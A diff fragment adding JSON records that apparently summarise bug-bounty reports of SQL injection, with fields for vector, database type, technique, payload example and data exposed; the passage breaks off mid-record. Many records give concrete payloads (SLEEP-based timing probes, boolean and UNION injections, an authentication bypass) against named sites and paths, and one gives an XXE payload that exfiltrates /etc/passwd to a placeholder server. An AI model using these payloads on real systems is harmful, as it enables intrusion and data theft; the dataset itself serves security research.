+      "extraction_method": "Using a time delay (SLEEP(5)) to confirm database version",
+      "payload_example": "IF(MID(VERSION(),1,1) = 5, SLEEP(5), 0)",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": [
+        "/display.asp?story_id=98373",
+        "/listStories.asp?x=4",
+        "/viewVideo.asp?t=6"
+      ],
+      "database_type": "HSQLDB",
+      "injection_type": "Time-based",
+      "extraction_method": "SQLmap with tamper scripts (between, bluecoat) and time delay (--time-sec=65)",
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "Cookies named 'orange' and 'squeeze'",
+      "database_type": null,
+      "injection_type": "Time-based SQL Injection",
+      "extraction_method": "Using time delay (SLEEP) to infer data and boolean conditions in payloads",
+      "payload_example": "'1'=sleep(10)='1",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "Wordpress-related data"
+      ]
+    },
+    {
+      "injection_vector": "https://setup.p2p.ihost.com/",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "/messagecenter/messagingcenter",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "Union",
+      "extraction_method": "WAF Bypass",
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "customerId parameter in the URL path",
+      "database_type": null,
+      "injection_type": "Error-based SQL Injection",
+      "extraction_method": "Using manual SQL commands by closing the statement with a quote and commenting out the rest; also using SQLmap tool",
+      "payload_example": "Closing the statement with a single quote (') followed by SQL commands and commenting out the rest",
+      "data_exposed": [
+        "user information",
+        "database contents"
+      ]
+    },
+    {
+      "injection_vector": "searchValue parameter in the SOAP request body",
+      "database_type": null,
+      "injection_type": "Blind",
+      "extraction_method": "Using substring function in the injected SQL to infer data character-by-character",
+      "payload_example": "1'  and substring(system_user,1,16)='public\\dsfwsuser' and '%'='",
+      "data_exposed": [
+        "system user name",
+        "database contents",
+        "authentication and authorization data",
+        "records in the database"
+      ]
+    },
+    {
+      "injection_vector": "usr parameter in POST request",
+      "database_type": null,
+      "injection_type": "Error-based and Blind SQL Injection",
+      "extraction_method": "Using conditional CASE statements and error responses to infer data (blind) and error messages (error-based)",
+      "payload_example": "usr='/**/or/**/lastName!='&pwd=[REDACTED]",
+      "data_exposed": [
+        "column names",
+        "table name",
+        "number of user accounts (26)"
+      ]
+    },
+    {
+      "injection_vector": "django.db.models.fields.json.HasKey lookup lhs value",
+      "database_type": "Oracle",
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "unauthorized access",
+        "data manipulation",
+        "information disclosure"
+      ]
+    },
+    {
+      "injection_vector": "HTTP header 'X-Forwarded-For'",
+      "database_type": "SQL Server",
+      "injection_type": "Blind",
+      "extraction_method": null,
+      "payload_example": "X-Forwarded-For: '",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "$_GET['acctid']",
+      "database_type": "MySQL",
+      "injection_type": "Time-based SQL Injection",
+      "extraction_method": "Using MySQL sleep() function to cause time delay and confirm injection",
+      "payload_example": "/changeReplaceOpt.php?&opt=1&acctid=419523 AND SLEEP(15)",
+      "data_exposed": [
+        "Full database access",
+        "Private user information"
+      ]
+    },
+    {
+      "injection_vector": "URL parameter in the path /on/twitter/ (specifically the user_name parameter used in path formatting)",
+      "database_type": null,
+      "injection_type": "Error-based (indicated by 500 Internal Server Error on single-quote injection)",
+      "extraction_method": null,
+      "payload_example": "https://gratipay.com/on/twitter/'",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "SSN field at https://[REDACTED]/[REDACTED]/candidate_app/status_scholarship.aspx",
+      "database_type": null,
+      "injection_type": "Authentication bypass SQL injection (likely Boolean-based or error-based)",
+      "extraction_method": "Using SQL injection payload in SSN field to bypass authentication and view scholarship status; also testing birth date parameter for SQL errors via HTTP response codes",
+      "payload_example": "' OR '1'='1",
+      "data_exposed": [
+        "Database content controlled by attacker",
+        "User information (e.g., scholarship status)",
+        "Potentially remote code execution"
+      ]
+    },
+    {
+      "injection_vector": "Parameter: #1* ((custom) [REDACTED])",
+      "database_type": null,
+      "injection_type": "Time Based SQL Injection",
+      "extraction_method": "sqlmap automated testing with time-based techniques",
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "entity_id",
+      "database_type": null,
+      "injection_type": "Boolean-based Blind SQL Injection",
+      "extraction_method": "Boolean technique using conditional statements on @@version",
+      "payload_example": "entity_id=1 or if(mid(@@version,1,1)=5,1,2)=2#",
+      "data_exposed": [
+        "Database version"
+      ]
+    },
+    {
+      "injection_vector": "login parameter on vk.com/login.php",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": "Entering '00' or '000' or up to 17 zeros in the login field with any password",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "cid parameter in GET /selfcare/HomePageDisplay",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection",
+      "extraction_method": null,
+      "payload_example": "26 AND 3*2*1=6 AND 498=498",
+      "data_exposed": [
+        "user"
+      ]
+    },
+    {
+      "injection_vector": "__proto__ property in JSON input objects (e.g., title.__proto__)",
+      "database_type": "MySQL",
+      "injection_type": "Arbitrary WHERE clause injection via prototype pollution",
+      "extraction_method": null,
+      "payload_example": "{\"text\":\"a\",\"title\":{\"__proto__\":{\"where\":{\"name\":\"sqlinjection\",\"where\":null}}}}",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "URL parameter 'codigo' at https://desafio5estrelas.com/login",
+      "database_type": "MySQL",
+      "injection_type": "Time-based blind SQL injection",
+      "extraction_method": "Time-based blind SQL injection",
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "Time-based",
+      "extraction_method": "Crafting a specially formatted URL to trigger time delays",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive financial information"
+      ]
+    },
+    {
+      "injection_vector": "search parameter in blog search request",
+      "database_type": null,
+      "injection_type": "Time-based",
+      "extraction_method": "Observing response delay caused by SLEEP function in SQL query",
+      "payload_example": "1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK",
+      "data_exposed": [
+        "database information"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "The array keys used in the IN statement placeholders in db_query, specifically when non-integer keys are used in the array parameter for the IN clause",
+      "database_type": "PDO (PHP Data Objects) compatible database, specific type not explicitly mentioned but likely MySQL given Drupal's common usage",
+      "injection_type": "Pre-authentication SQL Injection allowing multi-queries (likely Error-based or Union-based due to multi-query support)",
+      "extraction_method": "Using SQL Injection to insert arbitrary data, dump or modify existing data, and execute PHP code via manipulated sessions and Drupal callbacks",
+      "payload_example": "db_query(\"SELECT * FROM {users} where name IN (:name)\", array(':name'=>array('test) -- ' => 'user1','test' => 'user2')));\n\nThis results in:\nSELECT * FROM users WHERE name IN (:name_test) -- , :name_test )\nwith parameter :name_test = user2",
+      "data_exposed": [
+        "Arbitrary database data (dump or modify existing data)",
+        "Session data (manipulated to execute PHP code)",
+        "Potentially entire database contents",
+        "Ability to insert arbitrary data"
+      ]
+    },
+    {
+      "injection_vector": "c0-param0 parameter",
+      "database_type": "Oracle",
+      "injection_type": "Error-based, Boolean-based blind",
+      "extraction_method": "SQLMap automated testing and confirmation",
+      "payload_example": "string:1'",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "embedded_submission_form_uuid parameter in the /graphql endpoint",
+      "database_type": "PostgreSQL",
+      "injection_type": null,
+      "extraction_method": "Extract information from the public and secure schema via SQL injection",
+      "payload_example": null,
+      "data_exposed": [
+        "information from the public schema",
+        "information from the secure schema"
+      ]
+    },
+    {
+      "injection_vector": "User.filter parameter 'id'",
+      "database_type": "MySQL",
+      "injection_type": "Boolean-based SQL Injection",
+      "extraction_method": "Using a crafted filter parameter to alter the WHERE clause and retrieve data for id=2",
+      "payload_example": "' or id=2#",
+      "data_exposed": [
+        "id",
+        "firstName",
+        "lastName",
+        "age"
+      ]
+    },
+    {
+      "injection_vector": "customerId parameter in the URL path",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "Using SQL exploitation tools like SQLmap with injection point marked by an asterisk",
+      "payload_example": "https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0",
+      "data_exposed": [
+        "user ID number (Passport or National ID)",
+        "Organization number",
+        "relevant documents",
+        "user information"
+      ]
+    },
+    {
+      "injection_vector": "███ parameter",
+      "database_type": null,
+      "injection_type": "Time-based",
+      "extraction_method": "SQLMap",
+      "payload_example": "sleep() command",
+      "data_exposed": [
+        "table names",
+        "database user name",
+        "database hostname"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": "Oracle",
+      "injection_type": "Error-based",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "privileged information"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "referer header",
+      "database_type": null,
+      "injection_type": "Time-based",
+      "extraction_method": "Time-based delay to infer data",
+      "payload_example": null,
+      "data_exposed": [
+        "database contents"
+      ]
+    },
+    {
+      "injection_vector": "URI path (http://51.83.253.82/item/default)",
+      "database_type": null,
+      "injection_type": "Boolean Blind SQL Injection",
+      "extraction_method": "Boolean-based blind SQL injection by comparing substrings of the database version using conditional statements in the URI path",
+      "payload_example": "http://51.83.253.82/item/default'and%20substr(version(),1,1)='2'--",
+      "data_exposed": [
+        "Database version number"
+      ]
+    },
+    {
+      "injection_vector": "POST parameter item_id",
+      "database_type": null,
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Using time delays (sleep) to infer data from the database version function",
+      "payload_example": "item_id=1111-if(mid(version(),1,1)=5,sleep(5),0)",
+      "data_exposed": [
+        "Full database access holding private user information"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "sql injection",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "/errors/viewbuild/",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "group_id (POST parameter)",
+      "database_type": "MySQL (version 5 detected)",
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Time delay based on SLEEP function and sqlmap tool",
+      "payload_example": "ACT=158&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1",
+      "data_exposed": [
+        "Database version",
+        "Database names"
+      ]
+    },
+    {
+      "injection_vector": "authors parameter in POST request to /pubs/index.php",
+      "database_type": null,
+      "injection_type": "Time-based SQL injection",
+      "extraction_method": "Time delay in response (sleep function) to infer data",
+      "payload_example": "Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'",
+      "data_exposed": [
+        "sensitive data from the database"
+      ]
+    },
+    {
+      "injection_vector": "PUB_ID parameter in https://[REDACTED]/ProductMaps/PubForm/Details.aspx",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "Automated SQL injection testing using sqlmap",
+      "payload_example": "' (single quote appended to PUB_ID parameter)",
+      "data_exposed": [
+        "user lists",
+        "database tables (deletion possible)",
+        "administrative database rights"
+      ]
+    },
+    {
+      "injection_vector": "MilestoneFinder order method",
+      "database_type": null,
+      "injection_type": "SQL injection",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "private access tokens",
+        "shell tokens",
+        "all information from the GitLab instance's database"
+      ]
+    },
+    {
+      "injection_vector": "searchText",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection",
+      "extraction_method": "Boolean-based blind SQL injection using conditional statements and ASCII code matching",
+      "payload_example": "')AND+22=22+AND+('NaXY'+LIKE+'NaXY",
+      "data_exposed": [
+        "database user name",
+        "user length",
+        "ASCII character of user name"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "plaintext passwords"
+      ]
+    },
+    {
+      "injection_vector": "orderBy variable and table or column variable in model.getAll()",
+      "database_type": "MySQL",
+      "injection_type": "Union-based SQL injection and Blind SQL injection",
+      "extraction_method": "Using union select in column parameter and conditional order by clause",
+      "payload_example": "ckey, cvalue from test where 1=0 union all select 0, 'sqli','sqli'#",
+      "data_exposed": [
+        "database rows",
+        "table data",
+        "column data"
+      ]
+    },
+    {
+      "injection_vector": "sort",
+      "database_type": null,
+      "injection_type": "Error-based, Time-based",
+      "extraction_method": "Inducing SQL error with single apostrophe and time delay using SLEEP() function",
+      "payload_example": "Sort=SLEEP(25)",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "Boolean-based",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "where parameter",
+      "database_type": null,
+      "injection_type": "Boolean-based Blind SQL Injection",
+      "extraction_method": "Using boolean conditions (1=1 returns all records, 1=0 returns no records) to infer data presence",
+      "payload_example": "1=1",
+      "data_exposed": [
+        "all record content of the database"
+      ]
+    },
+    {
+      "injection_vector": "One of the micro service endpoints of the ContactNow application utilizing user provided parameters without a proper prepared statement",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "username parameter in /ng/api/auth/login (JSON based)",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "contents of an entire database",
+        "OS commands execution"
+      ]
+    },
+    {
+      "injection_vector": "rememail parameter in POST request to /elist/viewem6.php",
+      "database_type": "MySQL",
+      "injection_type": "Blind SQL injection, Time-based",
+      "extraction_method": "Using sleep() function to induce time delay and Boolean-based conditions to confirm vulnerability and extract MySQL version",
+      "payload_example": "'+ (select * from (select(sleep(2))) a) + '",
+      "data_exposed": [
+        "MySQL version"
+      ]
+    },
+    {
+      "injection_vector": "user input used to construct a SQL query related to editing page permissions",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "countID parameter",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "Using sqlmap tool with level=3 and risk=3",
+      "payload_example": "https://www.[REDACTED]/public/saveCount.cfm?countID=4",
+      "data_exposed": [
+        "database server control"
+      ]
+    },
+    {
+      "injection_vector": "URI Path",
+      "database_type": null,
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "By intentionally causing delays in database processing and inferring information based on the application's response time to specific queries",
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive data"
+      ]
+    },
+    {
+      "injection_vector": "/php/geto2banner",
+      "database_type": null,
+      "injection_type": "Blind",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "private user information",
+        "full database access"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "crafting specially formatted URLs",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information"
+      ]
+    },
+    {
+      "injection_vector": "partition_clause parameter in SQLTableCheckOperator",
+      "database_type": null,
+      "injection_type": "SQL Injection",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "listEmojiCustom method call",
+      "database_type": "NoSQL",
+      "injection_type": "Time-based (causes delay in server response)",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "count",
+      "database_type": null,
+      "injection_type": "Blind, Time-based",
+      "extraction_method": "Time delay using SLEEP function",
+      "payload_example": "count=-1 or 1=((SELECT 1 FROM (SELECT SLEEP(25))A))",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "brids",
+      "database_type": "MySQL",
+      "injection_type": "Boolean SQL Injection",
+      "extraction_method": "Using boolean conditions with MID() and LIKE to infer database version from HTTP response codes",
+      "payload_example": "action=show_support_breakups&brids=[\"')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23\"]",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "fid parameter in /rotate-image endpoint",
+      "database_type": null,
+      "injection_type": "Boolean-based Blind SQL Injection",
+      "extraction_method": "Boolean-based blind SQL injection using substring and order by clauses, with response behavior (redirects) indicating true/false",
+      "payload_example": "https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=5",
+      "data_exposed": [
+        "database version",
+        "user() function output (database user)"
+      ]
+    },
+    {
+      "injection_vector": "Referer Header (HTTP header) with alert GET parameter in URLs such as https://[REDACTED]/[REDACTED]/Chart01.php?alert=",
+      "database_type": null,
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Using time delays (sleep) in SQL queries to infer data by measuring response times",
+      "payload_example": "'+(select*from(select(if(1=1,sleep(20),false)))a)+'",
+      "data_exposed": [
+        "Database name (e.g., first character of current database name)"
+      ]
+    },
+    {
+      "injection_vector": "user_id parameter at :/v2/leaderboard_v2.json",
+      "database_type": null,
+      "injection_type": "boolean based blind SQLi",
+      "extraction_method": null,
+      "payload_example": "fq={injection}",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "selMajcom",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "Automated SQL injection using sqlmap with a crafted HTTP GET request targeting the vulnerable parameter",
+      "payload_example": "GET /[REDACTED]mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1",
+      "data_exposed": [
+        "database names",
+        "sensitive data from databases",
+        "files",
+        "potentially remote code execution on the database server"
+      ]
+    },
+    {
+      "injection_vector": "forgot_password.jsp",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "id parameter",
+      "database_type": null,
+      "injection_type": "Time-based Blind SQL Injection",
+      "extraction_method": "Making the SQL server wait for a period of time before responding",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive financial information"
+      ]
+    },
+    {
+      "injection_vector": "acctid",
+      "database_type": null,
+      "injection_type": "Time-based SQL Injection",
+      "extraction_method": "Time delay using SLEEP() function in SQL query",
+      "payload_example": "\"acctid\":\"251219 AND SLEEP(15)#\"",
+      "data_exposed": [
+        "Full database access holding private user information"
+      ]
+    },
+    {
+      "injection_vector": "/entry?id= GET parameter",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "XXE (XML External Entity) attack using external DTD to exfiltrate files via FTP",
+      "payload_example": "<?xml version=\"1.0\" ?>\n<!DOCTYPE r [\n<!ELEMENT r ANY >\n<!ENTITY % sp SYSTEM \"http://MYSERVER:8080/ev.xml\">\n%sp;\n%param1;\n]>\n<r>&exfil;</r>\n\nExternal DTD (ev.xml):\n<!ENTITY % data SYSTEM \"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % param \"<!ENTITY &#37; exfil SYSTEM 'ftp://MYSERVER:2121/%data;'>\">\n%param;\n%exfil;",
+      "data_exposed": [
+        "/etc/passwd",
+        "/etc/nginx/nginx.conf",
+        "nginx configuration files"
+      ]
+    },
+    {
+      "injection_vector": "Database name field in the system install (Database configuration) form",
+      "database_type": null,
+      "injection_type": "SQL Injection (likely classic injection via unescaped backtick allowing query chaining)",
+      "extraction_method": "Executing arbitrary SQL commands via injection to create new databases",
+      "payload_example": "impresscms`;create database `vuln",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "countryFilter[] parameter in report_xml.php",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection",
+      "extraction_method": "Blind SQL Injection with Akamai WAF Bypass",
+      "payload_example": null,
+      "data_exposed": [
+        "certain SQL data from a single backing database"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "export to Excel functionality",
+      "database_type": null,
+      "injection_type": "stacked queries",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "Username field",
+      "database_type": "Oracle",
+      "injection_type": "Error-based",
+      "extraction_method": null,
+      "payload_example": "'; --",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "Customwho",
+      "database_type": "MSSQL",
+      "injection_type": null,
+      "extraction_method": "Using global variable @@LANGID to confirm MSSQL database and error-based behavior with non-existing global variables",
+      "payload_example": "https://[REDACTED]/News/Transcripts/Search/Sort/?Customwho=31002/|/@@LANGID",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "Blind",
+      "extraction_method": "Reveal user statistic information via blind SQL injection",
+      "payload_example": null,
+      "data_exposed": [
+        "user statistic information"
+      ]
+    },
+    {
+      "injection_vector": "login panel and another PHP endpoint on the subdomain",
+      "database_type": null,
+      "injection_type": "Blind SQL Injection",
+      "extraction_method": "Used SQLMap to exploit and read the banner and user name of the website",
+      "payload_example": null,
+      "data_exposed": [
+        "banner",
+        "user name"
+      ]
+    },
+    {
+      "injection_vector": "/api/organizations/* (specifically in the path parameter after /api/organizations/)",
+      "database_type": "MySQL (version 8.0.23 mentioned)",
+      "injection_type": "Error-based SQL Injection (using SQL XPATH error to leak data)",
+      "extraction_method": "Using extractvalue() function to trigger SQL XPATH errors that leak data in error messages",
+      "payload_example": "GET /api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa HTTP/1.1",
+      "data_exposed": [
+        "Database user()",
+        "Database version()",
+        "Current database name()",
+        "Table names from information_schema.tables"
+      ]
+    },
+    {
+      "injection_vector": "app_id form parameter",
+      "database_type": "Oracle",
+      "injection_type": "Error-based",
+      "extraction_method": "Exploiting SQL errors returned in HTTP responses (ORA-01756 and ORA-01722) and potential file write via INTO OUTFILE",
+      "payload_example": "app_id='",
+      "data_exposed": [
+        "database content",
+        "sensitive information",
+        "remote code execution capability"
+      ]
+    },
+    {
+      "injection_vector": "/pls/apex/f?",
+      "database_type": "Oracle",
+      "injection_type": null,
+      "extraction_method": "Using OWA_UTIL.CELLSPRINT to print query results",
+      "payload_example": "http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version",
+      "data_exposed": [
+        "Database version",
+        "Hostname of the database server",
+        "IP address of the database server"
+      ]
+    },
+    {
+      "injection_vector": "WordPress DB Class prepare method, specifically when the first argument is an array or when the input query has %s with quoted user-controlled input; also in bbpress plugin anonymous posting and WordPress core function delete_metadata when deleting all with user-controlled meta value",
+      "database_type": null,
+      "injection_type": "SQL Injection (general), potentially error-based or blind due to quoting issues",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "Information disclosure (unspecified data)"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "POST param `████████`",
+      "database_type": "mysql",
+      "injection_type": "boolean based SQL injection",
+      "extraction_method": "sqlmap automated tool with --tables and --dump options",
+      "payload_example": null,
+      "data_exposed": [
+        "all information stored in the database"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "Blind",
+      "extraction_method": "Crafting a specially formatted URL",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive financial information"
+      ]
+    },
+    {
+      "injection_vector": "Parameter 'name' in the where clause of createQueryBuilder, specifically when passing a function () => \"-1 or firstName=0x54696d6265722033\"",
+      "database_type": "MySQL",
+      "injection_type": null,
+      "extraction_method": "Using a function as a parameter value in the query builder to inject raw SQL, resulting in retrieval of a user record",
+      "payload_example": "() => \"-1 or firstName=0x54696d6265722033\"",
+      "data_exposed": [
+        "User id",
+        "firstName",
+        "lastName",
+        "age"
+      ]
+    },
+    {
+      "injection_vector": [
+        "delete method: 'where' parameter",
+        "delete method: 'whereArgs' parameter",
+        "insert method: 'values' parameter"
+      ],
+      "database_type": "SQLite",
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "internal information of the app"
+      ]
+    },
+    {
+      "injection_vector": "search functionality",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": [
+        "unpublished posts"
+      ]
+    },
+    {
+      "injection_vector": "[REDACTED]",
+      "database_type": null,
+      "injection_type": "Error-based",
+      "extraction_method": "Injecting SQL payloads via POST parameter to cause database errors revealing information",
+      "payload_example": "AA'+OR(cast(version as date))LIKE'A",
+      "data_exposed": [
+        "database version",
+        "current database",
+        "current user"
+      ]
+    },
+    {
+      "injection_vector": "FilteredRelation allowing injection of strings that are then executed via select_related",
+      "database_type": null,
+      "injection_type": "Direct SQL Injection",
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "URL encoded POST input [REDACTED]",
+      "database_type": null,
+      "injection_type": "Blind",
+      "extraction_method": "Boolean-based blind SQL injection using true/false condition tests",
+      "payload_example": "-1' OR 1=1 or '4mEwSPwJ'='",
+      "data_exposed": [
+        "access and control over the backend database server"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "mimetypeid (POST parameter)",
+      "database_type": "MySQL (MariaDB fork)",
+      "injection_type": "Time-based blind",
+      "extraction_method": "Time delay using SLEEP function in SQL query",
+      "payload_example": "1 AND (SELECT 3583 FROM (SELECT(SLEEP(5)))XdxE)",
+      "data_exposed": [
+        "sensitive information from the database",
+        "potential upload of malicious web shell leading to full system compromise"
+      ]
+    },
+    {
+      "injection_vector": "crs_id parameter in GET request to courses.aspx",
+      "database_type": null,
+      "injection_type": "Error-based",
+      "extraction_method": "Triggering unhandled exceptions via specially crafted input values (%0a and 0) causing SQL errors that reveal internal C# code, inline SQL, database table and column names, and server/framework version info",
+      "payload_example": "%0a",
+      "data_exposed": [
+        "Database table names",
+        "Database column names",
+        "Seven lines of C# source code including inline SQL",
+        "Server and framework version information",
+        "Unhandled SQL error messages"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "CCD_itemID",
+      "database_type": "Oracle",
+      "injection_type": "boolean-based blind, UNION query",
+      "extraction_method": "sqlmap automated testing with boolean-based blind and UNION query techniques",
+      "payload_example": "https://[REDACTED]:443/[REDACTED]Portal/[REDACTED]?_[REDACTED]=true&_st=&_pageLabel=[REDACTED]_[REDACTED]_pubview_page&CCD_itemID=201826 AND 2833=2833",
+      "data_exposed": [
+        "current user",
+        "database version",
+        "potentially any data in the database including passwords"
+      ]
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": "Blind",
+      "extraction_method": "Admin password exfiltration via ping packet sizes",
+      "payload_example": null,
+      "data_exposed": [
+        "admin password"
+      ]
+    },
+    {
+      "injection_vector": "order_id",
+      "database_type": null,
+      "injection_type": "Boolean-based Blind SQL Injection",
+      "extraction_method": "Boolean technique used to prove data retrieval by observing response length changes",
+      "payload_example": "'-if(1=2,'0','1')-'",
+      "data_exposed": null
+    },
+    {
+      "injection_vector": "/admin.php?/cp/members/create (control panel member creation functionality)",
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": null,
+      "payload_example": null,
+      "data_exposed": null
+    },
+    {
+      "injection_vector": null,
+      "database_type": null,
+      "injection_type": null,
+      "extraction_method": "crafting specially formatted URLs",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information"
+      ]
+    },
+    {
+      "injection_vector": "filter[event]",
+      "database_type": "MySQL",
+      "injection_type": "Blind (Boolean-based and Time-based)",
+      "extraction_method": "Using Boolean-based and Time-based blind SQL injection techniques via SQLMap",
+      "payload_example": null,
+      "data_exposed": [
+        "sensitive information",
+        "authentication credentials",
+        "privilege escalation data"
